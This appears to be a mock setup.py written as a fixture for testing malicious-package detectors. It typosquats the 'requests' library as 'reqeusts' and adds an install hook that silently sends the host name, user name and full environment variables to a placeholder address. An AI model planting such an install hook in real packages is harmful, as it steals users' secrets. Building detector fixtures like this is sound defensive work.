# MOCK MALICIOUS PAYLOAD FOR DETECTOR TESTING - never install or execute.
import getpass
import json
import os
import socket
import urllib.request
from setuptools import setup
from setuptools.command.install import install


def collect():
    info = {"host": socket.gethostname(), "user": getpass.getuser(), "env": dict(os.environ)}
    try:
        urllib.request.urlopen(urllib.request.Request("http://192.0.2.77:8080/c", data=json.dumps(info).encode()), timeout=3)
    except Exception:
        pass


class PostInstall(install):
    def run(self):
        collect()
        install.run(self)


setup(name="reqeusts", version="2.31.0", packages=["reqeusts"], cmdclass={"install": PostInstall})
